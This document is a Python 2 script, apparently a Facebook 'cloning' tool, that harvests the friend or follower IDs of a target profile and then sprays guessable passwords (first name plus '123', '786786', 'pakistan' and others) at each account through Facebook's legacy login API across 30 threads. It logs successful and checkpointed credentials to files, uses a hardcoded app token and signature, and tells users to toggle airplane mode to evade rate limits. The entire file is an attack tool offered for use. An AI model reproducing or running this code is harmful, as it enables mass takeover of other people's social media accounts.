#coding=utf-8

#!/usr/bin/python2

#Orignal Coding by (UZAIR KHAN)

 

try:

    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests

    from multiprocessing.pool import ThreadPool

except ImportError:

    os.system("pip2 install requests")

    os.system("python2")

    os.system("clear")

bd=random.randint(2e7, 3e7)

sim=random.randint(2e4, 4e4)

header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}

reload(sys)

sys.setdefaultencoding("utf-8")

c = "\033[1;92m"

c2 = "\033[0;97m" 

c3 = "\033[1;91m"

logo = """

 '##::::'##:'########::::'###::::'####:'########::

 ##:::: ##:..... ##::::'## ##:::. ##:: ##.... ##:

 ##:::: ##::::: ##::::'##:. ##::: ##:: ##:::: ##:

 ##:::: ##:::: ##::::'##:::. ##:: ##:: ########::

 ##:::: ##::: ##::::: #########:: ##:: ##.. ##:::

 ##:::: ##:: ##:::::: ##.... ##:: ##:: ##::. ##::

. #######:: ########: ##:::: ##:'####: ##:::. ##:

:.......:::........::..:::::..::....::..:::::..::

\033[1;92m------------------------------------------------------

\033[1;93m(!)\033[1;92m Author   : UZAIR KHAN

\033[1;93m(!)\033[1;92m WhatsApp : 03013025428

\033[1;93m(!)\033[1;92m Github   : https://github.com/Qadirking

\033[1;93m(!)\033[1;92m Facebook : UZAIRKHANAFRIDI

\033[1;92m------------------------------------------------------

"""

def main():

    os.system("clear")

    print logo

    print("")

    print("    \033[1;93m[ main menu ]").center(50)

    print("\033[1;93m-----------------------------------------------------")

    print("\033[1;93m [1]\033[1;92m [START CLONING]")

    print("")

    print("\033[1;93m [2]\033[1;92m [CONTECT OWNER]")

    print("")

    print("\033[1;93m [0]\033[1;91m [EXIT]")

    print("\033[1;93m-----------------------------------------------------")

    main_select()

def main_select():

    Qm = raw_input("\033[1;93mChoose Opition : \033[1;92m ")

    if Qm  =="1":

        login()

    if Qm =="2":

        os.system("xdg-open https://www.facebook.com/UZAIRKHANAFRIDI2")

	
        os.system("exit")

    else:

        print("[!] Please select a valid option").center(50)

        time.sleep(2)

        main()

def login():

    os.system("clear")

    print logo

    print("       \033[1;93m[ Login Menu ]").center(50)

    print("\033[1;92m-----------------------------------------------------")

    print("\033[1;93m[1]\033[1;92m [LOGIN WITH TOKEN]")

    print("")

    print("\033[1;93m[3]\033[1;91m [BACK]")

    print("\033[1;92m-----------------------------------------------------")

    print("")

    login_select()

def login_select():

    print("")

    Mz = raw_input("\033[1;92mChoose Option :\033[1;93m ")

    if Mz =="1":

        os.system("clear")

        print logo

	print("\033[1;93m[ Login with Token ]").center(50)

	print("")

	print("")

        token = raw_input("\033[1;92m[!] Token : \033[0;91m")

        token_s = open(".fb_token.txt","w")

        token_s.write(token)

        token_s.close()

        try:

            r = requests.get("https://graph.facebook.com/me?access_token="+token)

            q = json.loads(r.text)

            name = q["name"]

            nm = name.rsplit(" ")[0]

            print("")

            print("\033[1;92mYour token login successfully").center(50)

            time.sleep(1)

            os.system("xdg-open https://www.facebook.com/Abdul.X.786")

            menu()

        except (KeyError , IOError):

	    

            print("")

            print("\033[1;91mToken invalid or account has checkpoint\033[0;97m").center(50)

            print("")

            time.sleep(2)

            login()

            

    elif Qm =="2":

        os.system("xdg-open https://www.facebook.com/UZAIRKHANAFRIDI2")

    elif Qm =="3":

        main()

        

    else:

        print("")

        print("Select a valid option").center(50)

        print("")

        login_select()

def menu():

    global token

    os.system("clear")

    print logo

    try:

        token = open(".fb_token.txt","r").read()

    except (KeyError , IOError):

        login()

    try:

        r = requests.get("https://graph.facebook.com/me?access_token="+token)

        q = json.loads(r.text)

        nm = q["name"]

        nmf = nm.rsplit(" ")[0]

        ok = nmf

    except (KeyError , IOError):

        print("")

        print("\033[1;91mlogin account has checkpoint").center(50)

        print("")

        os.system("rm -rf .fb_token.txt")

        time.sleep(1)

        login()

    except requests.exceptions.ConnectionError:

        print logo

        print("")

        print("\033[1;91mYour internet connection failed").center(50)

        print("")

        time.sleep(2)

        menu()

    os.system("clear")

    

    print logo

    print("")

    print("    \t\033[1;93mWellcome : \033[1;92m" +nm)

    print("\033[1;93m-----------------------------------------------------")

    print("")

    print("\033[1;93m[1]\033[1;92m [Crack From Public id Friend list]")

    print("")

    print("\033[1;93m[2]\033[1;92m [Crack From Public id Followers]")

    print("")

    print("\033[1;93m[0]\033[1;91m [BACK]")

    print("")

    print("\033[1;93m-----------------------------------------------------")

    print("")

    menu_select()

def menu_select():

	

	select = raw_input("\033[1;93mChoose Option :\033[1;92m ")

	id=[]

	oks=[]

	cps=[]

	if select=="4":

		os.system("clear")

		print logo

		print("")

		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)

		z = json.loads(r.text)

		for s in z["data"]:

			uid=s['id']

			na=s['name']

			nm=na.rsplit(" ")[0]

			id.append(uid+'='+nm)

	if select =="1":

		os.system("clear")

		print(logo)

		print("")

		idt = raw_input("\033[1;93m[!] Put ID Link :\033[1;92m ")

		os.system("clear")

		print logo

		try:

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)

			q = json.loads(r.text)

			print("\033[1;93m Target from : \033[1;92m"+q["name"])

		except (KeyError , IOError):

		    print("")

		    print("\033[1;91myour login account has checkpoint").center(50)

		    print("")

		    menu()

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)

		z = json.loads(r.text)

		for i in z["data"]:

			uid=i['id']

			na=i['name']

			nm=na.rsplit(" ")[0]

			id.append(uid+'='+nm)

	elif select =="2":

		os.system("clear")

		print logo

		print("")

		print("")

                

		idt = raw_input("\033[1;93m[!] Put ID Link :\033[1;92m ")

		os.system("clear")

		print logo

		try:

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)

			q = json.loads(r.text)

			print(" \033[1;93mTarget from : \033[1;92m"+q["name"])

		except (KeyError , IOError):

		    print("")

		    print("\033[1;91m login id has checkpoint").center(50)

		    print("")

		    time.sleep(3)

		    menu()

		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)

		z = json.loads(r.text)

		for i in z["data"]:

			

			uid=i['id']

			na=i['name']

			nm=na.rsplit(" ")[0]

			id.append(uid+'='+nm)

	elif select =="0":

	    os.system("exit")

	else:

	    print("")

	    print("Please Select A Valid Option").center(50)

	    time.sleep(2)

	    menu_select()

	print("\033[1;93m Total IDs : \033[1;92m"+str(len(id)))

	print("\033[1;93m Process has been started")

	print("\033[1;93m Plzz wait to Crack idzz")

	time.sleep(0.5)

	print("")

	print 54*("\033[1;92m-")

	print("\033[1;92m    [ 5 SECOND TURN ON AIRPLANE MODE AND TURN OFF]").center(50)

	print 54*("-")

	print('')

	def main(arg):

		user=arg

		uid,name=user.split("=")

		try:

		

		    pass1=name+"123"

		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

		    d=json.loads(q)

		    if 'www.facebook.com' in d['error_msg']:

		        print("\033[1;93m[UZAIRKHAN-Cp] "+uid+" | "+pass1+" | "+name)

		        cp=open("cp.txt","a")

		        cp.write(uid+" | "+pass1+"\n")

		        cp.close()

		        cps.append(uid)

		    else:

		    	if "access_token" in d:

		            print("\x1b[1;92m[UZAIRKHAN-OK] "+uid+" | "+pass1+"\x1b[1;0m")

		            ok=open("ok.txt","a")

		            ok.write(uid+" | "+pass1+"\n")

		            ok.close()

		            oks.append(uid)

		        else:

		            pass2=name+"1234"

		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

		            d=json.loads(q)

		            if 'www.facebook.com' in d['error_msg']:

		                print("\033[1;93m[UZAIRKHAN-Cp] "+uid+" | "+pass2+" | "+name)

		                cp=open("cp.txt","a")

		                cp.write(uid+" | "+pass2+"\n")

		                cp.close()

		                cps.append(uid)

		            else:

		                if 'access_token' in d:

		                    print("\x1b[1;92m[UZAIRKHAN-Ok] "+uid+" | "+pass2+"\x1b[1;0m")

		                    ok=open("ok.txt","a")

		                    ok.write(uid+" | "+pass2+"\n")

		                    ok.close()

		                    oks.append(uid)

		                else:

		                    pass3=name+"12345"

		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

		                    d=json.loads(q)

		                    if 'www.facebook.com' in d['error_msg']:

		                        print("\033[1;93m[UZAIRKHAN-Cp] "+uid+" | "+pass3+" | "+name)

		                        cp=open("ok.txt","a")

		                        cp.write(uid+" | "+pass3+"\n")

		                        cp.close()

		                        cps.append(uid)

		                    else:

		                        if 'access_token' in d:

		                            print(" \x1b[1;92m[UZAIRKHAN-Ok] "+uid+" | "+pass3+"\x1b[1;0m")

		                            ok=open("ok.txt","a")

		                            ok.write(uid+" | "+pass3+"\n")

		                            ok.close()

		                            oks.append(uid)

		                        else:

		                            pass4=name+"786"

		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

		                            d=json.loads(q)

		                            if 'www.facebook.com' in d['error_msg']:

		                                print("\033[1;93m[UZAIRKHAN-Cp] "+uid+" | "+pass4+" | "+name)

		                                cp=open("cp.txt","a")

		                                cp.write(uid+" | "+pass4+"\n")

		                                cp.close()

		                                cps.append(uid)

		                            else:

		                                if 'access_token' in d:

		                                    print("\x1b[1;92m[UZAIRKHAN-Ok] "+uid+" | "+pass4+"\x1b[1;0m")

		                                    ok=open("ok.txt","a")

		                                    ok.write(uid+" | "+pass4+"\n")

		                                    ok.close()

		                                    oks.append(uid)

		                                else:

		                                    pass5="786786"

		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

		                                    d=json.loads(q)

		                                    if 'www.facebook.com' in d['error_msg']:

		                                        print("\033[1;93m[UZAIRKHAN-Cp] "+uid+" | "+pass5+" | "+name)

		                                        cp=open("cp.txt","a")

		                                        cp.write(uid+" | "+pass5+"\n")

		                                        cp.close()

		                                        cps.append(uid)

		                                    else:

		                                        if 'access_token' in d:

		                                            print("\x1b[1;92m[UZAIRKHAN-Ok] "+uid+" | "+pass5+"\x1b[1;0m")

		                                            ok=open("ok.txt","a")

		                                            ok.write(uid+" | "+pass5+"\n")

		                                            ok.close()

		                                            oks.append(uid)

		                                        else:

		                                            pass6="223344"

		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

		                                            d=json.loads(q)

		                                            if 'www.facebook.com' in d['error_msg']:

		                                                print("\033[1;93m[UZAIRKHAN-Cp] "+uid+" | "+pass6+" | "+name)

		                                                cp=open("cp.txt","a")

		                                                cp.write(uid+" | "+pass6+"\n")

		                                                cp.close()

		                                                cps.append(uid)

		                                            else:

		                                                if 'access_token' in d:

		                                                    print("\x1b[1;92m[UZAIRKHAN-OK] "+uid+" | "+pass6+"\x1b[1;0m")

		                                                    ok=open("ok.txt","a")

		                                                    ok.write(uid+" | "+pass6+"\n")

		                                                    ok.close()

		                                                    oks.append(uid)

		                                                else:

		                                                    pass7="pakistan"

		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

		                                                    d=json.loads(q)

		                                                    if 'www.facebook.com' in d['error_msg']:

		                                                        print("\033[1;93m[UZAIRKHAN-Cp] "+uid+" | "+pass7+" | "+name)

		                                                        cp=open("cp.txt","a")

		                                                        cp.write(uid+" | "+pass7+"\n")

		                                                        cp.close()

		                                                        cps.append(uid)

		                                                    else:

		                                                        if 'access_token' in d:

		                                                            print("\x1b[1;92m[UZAIRKHAN-Ok] "+uid+" | "+pass7+"\x1b[1;0m")

		                                                            ok=open("ok.txt","a")

		                                                            ok.write(uid+" | "+pass7+"\n")

		                                                            ok.close()

		                                                            oks.append(uid)                                                     

		except:

			pass

        p = ThreadPool(30)

	p.map(main, id)

	print(47*"\x1b[0;92m-")

	print ("\x1b[0;92mProcess Has Been Completed")

	print ("\x1b[0;92mTotal CP/OK: "+str(len(cps))+"/"+str(len(oks)))

	print(47*"-")

        raw_input("\x1b[0;93mPress enter to Back")

	menu()

if __name__ == '__main__':

    main()
